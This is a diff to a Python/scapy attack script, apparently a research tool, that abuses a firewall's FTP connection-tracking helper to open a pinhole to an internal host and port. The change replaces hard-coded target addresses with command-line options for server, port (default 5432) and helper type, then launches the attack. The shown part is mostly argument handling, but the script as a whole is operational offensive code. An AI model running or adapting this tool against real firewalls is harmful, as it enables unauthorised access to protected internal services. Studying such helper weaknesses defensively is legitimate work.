@@ -1,10 +1,11 @@
-#! /usr/bin/env python
+#!/usr/bin/env python
 # Copyright 2011 Eric Leblond <eric@regit.org>
 
 import sys
 import re
 
 import threading
+import argparse
 
 from scapy.all import *
 
@@ -62,9 +63,16 @@ class ftp_helper(attack_target):
         conn.start()
         sniff(iface=ftptarget.iface, prn=ftptarget.ftp_from_server_callback, filter=ftptarget.build_filter(), store=0)
 
-#sniff(iface="vboxnet0", prn=ftp_from_server_callback, filter="tcp and host 192.168.2.2 and port 21", store=0)
-ftptarget = ftp_helper()
-ftptarget.ip = "192.168.2.2"
-ftptarget.port = 22
+parser = argparse.ArgumentParser(description='Open selected pin hole in firewall')
+parser.add_argument('--server', default='192.168.2.2')
+parser.add_argument('--port', default=5432)
+parser.add_argument('--helper', default='ftp')
+args = parser.parse_args()
 
-ftptarget.run()
+if args.helper == 'ftp':
+    ftptarget = ftp_helper()
+    ftptarget.ip = args.server
+    ftptarget.port = int(args.port)
+    ftptarget.run()
+else:
+    print "Selected protocol is currently unsupported"
